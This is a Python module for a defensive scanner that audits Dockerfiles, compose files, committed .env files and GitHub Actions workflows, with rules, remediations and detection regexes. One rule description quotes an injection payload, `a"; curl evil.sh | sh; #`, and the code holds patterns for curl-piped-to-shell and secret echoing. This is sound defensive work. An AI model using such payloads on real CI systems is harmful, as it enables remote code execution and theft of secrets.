"""Module 4: infrastructure-as-code and CI/CD auditor.

Covers Dockerfiles, docker-compose files, committed ``.env`` files and GitHub
Actions workflows. The workflow checks are motivated by the March 2025
compromise of ``tj-actions/changed-files`` (CVE-2025-30066): a mutable tag was
repointed to malicious code that dumped CI secrets into public build logs.
"""

from __future__ import annotations

import re
import subprocess
from dataclasses import dataclass
from pathlib import Path
from typing import Any

import yaml

from app.scanners.base import Finding, make_snippet, read_text


@dataclass(frozen=True)
class IacRule:
    """Static metadata for an IaC/CI rule."""

    id: str
    title: str
    severity: str
    cwe: str
    owasp: str
    description: str
    remediation: str
    secure_example: str


TJ_ACTIONS = (
    "In March 2025 the popular `tj-actions/changed-files` action (CVE-2025-30066, used by 23,000+ repositories) "
    "was compromised: attackers repointed its version tags to a malicious commit that printed CI secrets into "
    "build logs. Workflows pinned to a full commit SHA were unaffected."
)

RULES: dict[str, IacRule] = {r.id: r for r in [
    IacRule("DOCKER-ROOT-USER", "Container runs as root", "medium", "CWE-250", "A05",
            "The final image stage has no `USER` instruction (or switches to root), so the application runs as UID 0. "
            "A code-execution bug then has root inside the container, which makes container escapes easier.",
            "Create an unprivileged user and switch to it before `CMD`/`ENTRYPOINT`.",
            "RUN useradd --create-home --uid 10001 app\nUSER app"),
    IacRule("DOCKER-LATEST-TAG", "Base image uses :latest or no tag", "medium", "CWE-1357", "A08",
            "`latest` or an untagged base image changes underneath you, so builds are not reproducible and can silently pull in a compromised or broken image.",
            "Pin a specific version tag, ideally with its digest.",
            "FROM python:3.12.7-slim@sha256:<digest>"),
    IacRule("DOCKER-ADD-REMOTE", "ADD downloads a remote URL", "medium", "CWE-494", "A08",
            "`ADD <url>` fetches content at build time without integrity verification.",
            "Download with `curl` and verify a checksum, or vendor the file.",
            "RUN curl -fsSLo tool.tgz https://example.com/tool.tgz \\\n && echo \"<sha256>  tool.tgz\" | sha256sum -c -"),
    IacRule("DOCKER-CURL-PIPE-SH", "Remote script piped into a shell", "high", "CWE-494", "A08",
            "`curl ... | sh` executes whatever the server returns at build time, with no integrity check.",
            "Download the script, verify its checksum or signature, then run it.",
            "RUN curl -fsSLo install.sh https://example.com/install.sh \\\n && echo \"<sha256>  install.sh\" | sha256sum -c - && sh install.sh"),
    IacRule("DOCKER-SECRET-IN-ENV", "Secret baked into image via ENV/ARG", "high", "CWE-538", "A05",
            "Values set with `ENV`/`ARG` are stored in the image layers and visible through `docker history` and `docker inspect`.",
            "Use BuildKit secrets for build-time values and runtime environment variables or a secret manager for runtime values.",
            "# syntax=docker/dockerfile:1\nRUN --mount=type=secret,id=npm_token NPM_TOKEN=$(cat /run/secrets/npm_token) npm ci"),
    IacRule("DOCKER-EXPOSE-SSH", "SSH port exposed", "medium", "CWE-284", "A05",
            "Running sshd inside an application container widens the attack surface and usually indicates credentials in the image.",
            "Remove SSH. Use `docker exec` / `kubectl exec` for debugging.", "# no EXPOSE 22"),
    IacRule("DOCKER-NO-HEALTHCHECK", "No HEALTHCHECK defined", "low", "CWE-754", "A05",
            "Without a health check the orchestrator cannot detect a hung process, which affects availability.",
            "Add a lightweight HEALTHCHECK.",
            "HEALTHCHECK --interval=30s --timeout=3s CMD curl -fsS http://localhost:8000/health || exit 1"),
    IacRule("DOCKER-APT-NO-CLEANUP", "apt-get install without cache cleanup", "low", "CWE-1104", "A05",
            "Leaving `/var/lib/apt/lists` in the image bloats it and keeps stale package metadata.",
            "Install with `--no-install-recommends` and remove the lists in the same layer.",
            "RUN apt-get update && apt-get install -y --no-install-recommends git \\\n && rm -rf /var/lib/apt/lists/*"),
    IacRule("COMPOSE-PRIVILEGED", "Privileged container", "high", "CWE-250", "A05",
            "`privileged: true` gives the container all capabilities and device access, which is effectively root on the host.",
            "Remove `privileged` and grant only the specific capabilities needed with `cap_add`.",
            "cap_drop: [ALL]\ncap_add: [NET_BIND_SERVICE]"),
    IacRule("COMPOSE-HOST-NETWORK", "Host network mode", "medium", "CWE-668", "A05",
            "`network_mode: host` removes network isolation; the container can bind or sniff host interfaces.",
            "Use a user-defined bridge network and publish only required ports.", "ports:\n  - \"8000:8000\""),
    IacRule("COMPOSE-DOCKER-SOCK", "Docker socket mounted into container", "high", "CWE-250", "A05",
            "Mounting `/var/run/docker.sock` lets the container control the Docker daemon, which means root on the host.",
            "Do not mount the socket. If a tool truly needs it, use a socket proxy with a read-only allow-list.",
            "# remove: - /var/run/docker.sock:/var/run/docker.sock"),
    IacRule("COMPOSE-PLAINTEXT-SECRET", "Plaintext password in compose environment", "medium", "CWE-256", "A05",
            "A credential is written in clear text in the compose file and therefore in version control.",
            "Reference an environment variable or use Docker secrets.",
            "environment:\n  POSTGRES_PASSWORD_FILE: /run/secrets/db_password\nsecrets:\n  - db_password"),
    IacRule("DOTENV-COMMITTED", ".env file committed to the repository", "high", "CWE-538", "A05",
            "`.env` files hold runtime credentials and are meant to stay local. Committing one publishes every value in it to everyone with repository access, forever (it remains in history).",
            "Remove the file from the index (`git rm --cached .env`), add `.env` to `.gitignore`, commit a `.env.example` with placeholders, and rotate every credential it contained.",
            "# .gitignore\n.env\n# .env.example (committed)\nDATABASE_URL=postgres://user:<password>@localhost/shop"),
    IacRule("GHA-UNPINNED-ACTION", "Third-party GitHub Action not pinned to a commit SHA", "medium", "CWE-829", "A08",
            "The workflow references a third-party action by a mutable tag or branch. Whoever controls that repository can change the code your CI runs, with access to your secrets and `GITHUB_TOKEN`. " + TJ_ACTIONS,
            "Pin every third-party action to a full 40-character commit SHA and keep the tag as a comment. Let Dependabot update the pins.",
            "- uses: tj-actions/changed-files@ed68ef82c095e0d48ec87eccea555d944a631a4c  # v46.0.5"),
    IacRule("GHA-PRT-CHECKOUT", "pull_request_target checks out untrusted PR code", "high", "CWE-829", "A08",
            "`pull_request_target` runs in the base repository's context with secrets and a write token. Checking out the PR head ref then executes attacker-controlled code with those privileges (a \"pwn request\").",
            "Use `pull_request` for building untrusted code. If `pull_request_target` is required, never check out or run the PR head; split privileged steps into a separate `workflow_run` job.",
            "on: pull_request\njobs:\n  test:\n    permissions: { contents: read }\n    steps:\n      - uses: actions/checkout@<sha>"),
    IacRule("GHA-SCRIPT-INJECTION", "Script injection from untrusted event data in run:", "high", "CWE-94", "A03",
            "An attacker-controlled expression (issue/PR title or body, branch name, comment) is interpolated into a shell `run:` step. "
            "A title such as `a\"; curl evil.sh | sh; #` executes inside the runner with the job's secrets.",
            "Pass the value through an environment variable and quote it in the shell.",
            "- env:\n    TITLE: ${{ github.event.issue.title }}\n  run: echo \"$TITLE\""),
    IacRule("GHA-PERMISSIONS", "Workflow token permissions not restricted", "medium", "CWE-250", "A01",
            "No `permissions:` block (or `write-all`) means the `GITHUB_TOKEN` may get broad default write scopes. A compromised step can push code or tamper with releases.",
            "Declare least-privilege permissions at workflow or job level.",
            "permissions:\n  contents: read"),
    IacRule("GHA-SECRET-ECHO", "Secret printed in a run: step", "high", "CWE-532", "A09",
            "Echoing `${{ secrets.* }}` writes the value into the job log. Masking is best-effort and is bypassed by transformations such as base64 or splitting.",
            "Never print secrets. Pass them to tools through environment variables.",
            "- env:\n    API_TOKEN: ${{ secrets.API_TOKEN }}\n  run: ./deploy.sh  # reads $API_TOKEN"),
]}

SECRET_KEY_RE = re.compile(r"(?i)(password|passwd|secret|token|api[_-]?key|access[_-]?key|private[_-]?key|credential)")
UNTRUSTED_EXPR = re.compile(
    r"\$\{\{\s*(?:github\.event\.(?:issue\.(?:title|body)|pull_request\.(?:title|body|head\.ref|head\.label)|"
    r"comment\.body|review\.body|review_comment\.body|discussion\.(?:title|body)|head_commit\.(?:message|author\.(?:name|email))|"
    r"commits\[\d+\]\.message|pages\[\d+\]\.page_name)|github\.head_ref)\s*\}\}"
)


def _finding(rule_id: str, rel: str, line: int, lines: list[str], note: str = "", extra: dict[str, Any] | None = None) -> Finding:
    r = RULES[rule_id]
    return Finding(
        module="iac", rule_id=rule_id, title=r.title + (f": {note}" if note else ""), severity=r.severity, file=rel,
        line=line, description=r.description, remediation=r.remediation, secure_example=r.secure_example,
        cwe=r.cwe, owasp=r.owasp, snippet=make_snippet(lines, line),
        references=[f"https://cwe.mitre.org/data/definitions/{r.cwe.split('-')[1]}.html"] + (
            ["https://www.cisa.gov/news-events/alerts/2025/03/18/supply-chain-compromise-third-party-tj-actionschanged-files-cve-2025-30066-and-reviewdogaction"]
            if rule_id.startswith("GHA-UNPINNED") else []),
        extra={"kind": rule_id.split("-")[0].lower(), **(extra or {})},
    )


# ---------------------------------------------------------------------------- Dockerfile


def _is_dockerfile(rel: str) -> bool:
    name = rel.rsplit("/", 1)[-1]
    return name in ("Dockerfile", "Containerfile") or name.startswith("Dockerfile.") or name.endswith(".Dockerfile")


def _docker_instructions(text: str) -> list[tuple[int, str, str]]:
    out: list[tuple[int, str, str]] = []
    buf, start = "", 0
    for i, raw in enumerate(text.splitlines(), 1):
        line = raw.strip()
        if not buf and (not line or line.startswith("#")):
            continue
        if not buf:
            start = i
        if line.endswith("\\"):
            buf += line[:-1] + " "
            continue
        buf += line
        parts = buf.split(None, 1)
        out.append((start, parts[0].upper(), parts[1] if len(parts) > 1 else ""))
        buf = ""
    return out


def scan_dockerfile(rel: str, text: str) -> list[Finding]:
    """Audit one Dockerfile."""
    lines = text.splitlines()
    ins = _docker_instructions(text)
    findings: list[Finding] = []
    stages: list[str] = []
    froms = [(ln, arg) for ln, op, arg in ins if op == "FROM"]
    last_from_line = froms[-1][0] if froms else 1
    for ln, op, arg in ins:
        if op == "FROM":
            toks = [t for t in arg.split() if not t.startswith("--")]
            image = toks[0] if toks else ""
            if len(toks) >= 3 and toks[1].lower() == "as":
                stages.append(toks[2].lower())
            if image.lower() in stages or image == "scratch" or "@sha256:" in image or image.startswith("$"):
                continue
            last = image.rsplit("/", 1)[-1]
            if ":" not in last or last.endswith(":latest"):
                findings.append(_finding("DOCKER-LATEST-TAG", rel, ln, lines, image))
        elif op == "ADD" and re.search(r"\bhttps?://", arg):
            findings.append(_finding("DOCKER-ADD-REMOTE", rel, ln, lines))
        elif op == "RUN":
            if re.search(r"\b(?:curl|wget)\b[^|]*\|\s*(?:sudo\s+)?(?:ba|z|da)?sh\b", arg):
                findings.append(_finding("DOCKER-CURL-PIPE-SH", rel, ln, lines))
            if re.search(r"\bapt-get\s+(?:-\S+\s+)*install\b", arg) and "/var/lib/apt/lists" not in arg:
                findings.append(_finding("DOCKER-APT-NO-CLEANUP", rel, ln, lines))
        elif op in ("ENV", "ARG"):
            pairs = re.findall(r"([A-Za-z_][A-Za-z0-9_]*)\s*[= ]\s*(\"[^\"]*\"|'[^']*'|\S+)", arg) if "=" in arg or op == "ENV" else []
            for key, val in pairs:
                v = val.strip("'\"")
                if SECRET_KEY_RE.search(key) and v and not v.startswith("$") and len(v) >= 4:
                    findings.append(_finding("DOCKER-SECRET-IN-ENV", rel, ln, lines, key))
                    break
        elif op == "EXPOSE" and re.search(r"(?:^|\s)22(?:/tcp)?(?:\s|$)", arg):
            findings.append(_finding("DOCKER-EXPOSE-SSH", rel, ln, lines))
    # USER checks apply to the final stage only
    final_users = [(ln, arg.strip()) for ln, op, arg in ins if op == "USER" and ln > last_from_line]
    if not final_users:
        findings.append(_finding("DOCKER-ROOT-USER", rel, last_from_line, lines, "no USER instruction"))
    elif final_users[-1][1].split(":")[0] in ("root", "0"):
        findings.append(_finding("DOCKER-ROOT-USER", rel, final_users[-1][0], lines, "USER root"))
    if not any(op == "HEALTHCHECK" for _, op, _ in ins):
        findings.append(_finding("DOCKER-NO-HEALTHCHECK", rel, last_from_line, lines))
    return findings


# ---------------------------------------------------------------------------- YAML helpers


def _line_of(lines: list[str], pattern: str, start: int = 0) -> int:
    rx = re.compile(pattern)
    for i in range(start, len(lines)):
        if rx.search(lines[i]):
            return i + 1
    return start + 1 if start < len(lines) else 1


def _is_compose(rel: str) -> bool:
    name = rel.rsplit("/", 1)[-1].lower()
    return bool(re.fullmatch(r"(docker-)?compose(\.[\w-]+)?\.ya?ml", name))


def scan_compose(rel: str, text: str) -> list[Finding]:
    """Audit a docker-compose file."""
    lines = text.splitlines()
    try:
        data = yaml.safe_load(text) or {}
    except yaml.YAMLError:
        return []
    findings: list[Finding] = []
    services = data.get("services") or {}
    if not isinstance(services, dict):
        return []
    for svc_name, svc in services.items():
        if not isinstance(svc, dict):
            continue
        base = _line_of(lines, rf"^\s*{re.escape(str(svc_name))}\s*:") - 1
        if svc.get("privileged") is True:
            findings.append(_finding("COMPOSE-PRIVILEGED", rel, _line_of(lines, r"privileged\s*:\s*true", base), lines, svc_name))
        if str(svc.get("network_mode", "")).lower() == "host":
            findings.append(_finding("COMPOSE-HOST-NETWORK", rel, _line_of(lines, r"network_mode\s*:", base), lines, svc_name))
        for vol in svc.get("volumes") or []:
            src = vol if isinstance(vol, str) else (vol or {}).get("source", "")
            if "docker.sock" in str(src):
                findings.append(_finding("COMPOSE-DOCKER-SOCK", rel, _line_of(lines, r"docker\.sock", base), lines, svc_name))
        env = svc.get("environment") or {}
        if isinstance(env, dict):
            items = list(env.items())
        else:  # list form: ["KEY=value", ...]
            items = [tuple((str(e).split("=", 1) + [""])[:2]) for e in env]
        for key, val in items:
            v = "" if val is None else str(val)
            if SECRET_KEY_RE.search(str(key)) and v and not v.startswith("$") and not str(key).endswith("_FILE"):
                findings.append(_finding("COMPOSE-PLAINTEXT-SECRET", rel,
                                         _line_of(lines, rf"\b{re.escape(str(key))}\b", base), lines, str(key)))
    return findings


# ---------------------------------------------------------------------------- .env


def _is_dotenv(rel: str) -> bool:
    name = rel.rsplit("/", 1)[-1].lower()
    if not (name == ".env" or name.startswith(".env.")):
        return False
    return not name.endswith((".example", ".sample", ".template", ".dist", ".defaults", ".tmpl"))


def _is_tracked(root: Path, rel: str, is_git: bool) -> bool:
    if not is_git:
        return True
    try:
        r = subprocess.run(["git", "-C", str(root), "ls-files", "--error-unmatch", rel], capture_output=True, timeout=30)
    except (OSError, subprocess.SubprocessError):
        return True
    return r.returncode == 0


def scan_dotenv(root: Path, rel: str, text: str, is_git: bool) -> list[Finding]:
    """Flag committed ``.env`` files that contain at least one assignment."""
    if not _is_tracked(root, rel, is_git):
        return []
    lines = text.splitlines()
    assigns = [i for i, ln in enumerate(lines, 1) if re.match(r"^\s*(?:export\s+)?[A-Za-z_][A-Za-z0-9_]*\s*=\s*\S", ln)]
    if not assigns:
        return []
    keys = [re.match(r"^\s*(?:export\s+)?([A-Za-z_][A-Za-z0-9_]*)", lines[i - 1]).group(1) for i in assigns]  # type: ignore[union-attr]
    return [_finding("DOTENV-COMMITTED", rel, 1, lines, f"{len(keys)} variables",
                     extra={"variables": keys[:30]})]


# ---------------------------------------------------------------------------- GitHub Actions


def _is_workflow(rel: str) -> bool:
    return rel.startswith(".github/workflows/") and rel.endswith((".yml", ".yaml"))


def _enclosing_key(lines: list[str], idx: int) -> str | None:
    """Return the YAML key that owns line ``idx`` (handles block scalars)."""
    line = lines[idx]
    m = re.match(r"^(\s*)(?:-\s+)?([A-Za-z_][\w-]*)\s*:", line)
    if m and UNTRUSTED_EXPR.search(line[m.end():]):
        return m.group(2)
    indent = len(line) - len(line.lstrip())
    for j in range(idx - 1, -1, -1):
        prev = lines[j]
        if not prev.strip() or prev.lstrip().startswith("#"):
            continue
        p_indent = len(prev) - len(prev.lstrip())
        if p_indent < indent:
            km = re.match(r"^\s*(?:-\s+)?([A-Za-z_][\w-]*)\s*:", prev)
            return km.group(1) if km else None
    return None


def scan_workflow(rel: str, text: str) -> list[Finding]:
    """Audit one GitHub Actions workflow."""
    lines = text.splitlines()
    try:
        data = yaml.safe_load(text) or {}
    except yaml.YAMLError:
        return []
    if not isinstance(data, dict):
        return []
    findings: list[Finding] = []
    triggers = data.get("on", data.get(True, {}))  # PyYAML parses bare `on` as boolean True
    trig_names = set(triggers) if isinstance(triggers, (dict, list)) else {str(triggers)}
    jobs = data.get("jobs") or {}

    # unpinned third-party actions
    for i, ln in enumerate(lines):
        m = re.match(r"^\s*-?\s*uses\s*:\s*['\"]?([^'\"\s#]+)", ln)
        if not m:
            continue
        ref = m.group(1)
        if ref.startswith(("./", "docker://")) or "@" not in ref:
            continue
        action, _, version = ref.partition("@")
        owner = action.split("/", 1)[0].lower()
        if owner in ("actions", "github"):
            continue
        if not re.fullmatch(r"[0-9a-f]{40}", version):
            findings.append(_finding("GHA-UNPINNED-ACTION", rel, i + 1, lines, ref,
                                     extra={"action": action, "ref": version}))

    # pull_request_target + checkout of the PR head
    if "pull_request_target" in trig_names:
        for i, ln in enumerate(lines):
            if re.search(r"ref\s*:\s*.*(github\.event\.pull_request\.head\.(sha|ref)|github\.head_ref)", ln):
                findings.append(_finding("GHA-PRT-CHECKOUT", rel, i + 1, lines))

    # script injection + secret echo inside run:
    for i, ln in enumerate(lines):
        if UNTRUSTED_EXPR.search(ln) and _enclosing_key(lines, i) == "run":
            expr = UNTRUSTED_EXPR.search(ln).group(0)  # type: ignore[union-attr]
            findings.append(_finding("GHA-SCRIPT-INJECTION", rel, i + 1, lines, expr))
        if re.search(r"\b(?:echo|printf|cat)\b.*\$\{\{\s*secrets\.", ln) and _enclosing_key(lines, i) == "run":
            findings.append(_finding("GHA-SECRET-ECHO", rel, i + 1, lines))

    # permissions
    top = data.get("permissions")
    if top == "write-all":
        findings.append(_finding("GHA-PERMISSIONS", rel, _line_of(lines, r"^permissions\s*:"), lines, "write-all"))
    elif top is None:
        job_perms = [isinstance(j, dict) and "permissions" in j for j in jobs.values()] if isinstance(jobs, dict) else []
        if not job_perms or not all(job_perms):
            findings.append(_finding("GHA-PERMISSIONS", rel, _line_of(lines, r"^jobs\s*:"), lines, "no permissions block"))
    if isinstance(jobs, dict):
        for name, job in jobs.items():
            if isinstance(job, dict) and job.get("permissions") == "write-all":
                findings.append(_finding("GHA-PERMISSIONS", rel, _line_of(lines, r"permissions\s*:\s*write-all"), lines,
                                         f"job {name}: write-all"))
    return findings


# ---------------------------------------------------------------------------- driver


def scan_iac(root: Path, files: list[str], is_git: bool = False) -> list[Finding]:
    """Run every IaC/CI check over the file list."""
    findings: list[Finding] = []
    for rel in files:
        if not (_is_dockerfile(rel) or _is_compose(rel) or _is_dotenv(rel) or _is_workflow(rel)):
            continue
        text = read_text(root / rel)
        if text is None:
            continue
        if _is_dockerfile(rel):
            findings += scan_dockerfile(rel, text)
        elif _is_compose(rel):
            findings += scan_compose(rel, text)
        elif _is_dotenv(rel):
            findings += scan_dotenv(root, rel, text, is_git)
        elif _is_workflow(rel):
            findings += scan_workflow(rel, text)
    return findings
